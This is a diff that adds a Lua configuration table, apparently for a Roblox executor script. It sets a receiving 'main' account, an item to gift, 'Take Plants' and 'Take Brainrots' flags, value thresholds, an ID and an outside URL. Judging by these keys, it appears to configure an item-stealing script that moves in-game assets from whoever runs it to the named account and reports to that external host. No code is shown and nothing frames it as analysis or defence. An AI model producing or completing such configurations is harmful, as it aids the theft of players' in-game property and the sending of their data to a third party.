@@ -1,0 +1,13 @@
+getgenv().Config = {
+    ["Account Main"] = {"Min3rCooki3Claw"},
+    ["Item Gift"] = {"King Limone"},
+    ["Take Plants"] = true,
+    ["Custom"] = {
+        ["Enable"] = false,
+        ["Min"] = 100000,
+        ["Max"] = 900000
+    },
+    ["Take Brainrots"] = false,
+    ["UUID"] = "dracular000",
+    ["Url"] = "https://yummydata.click"
+}
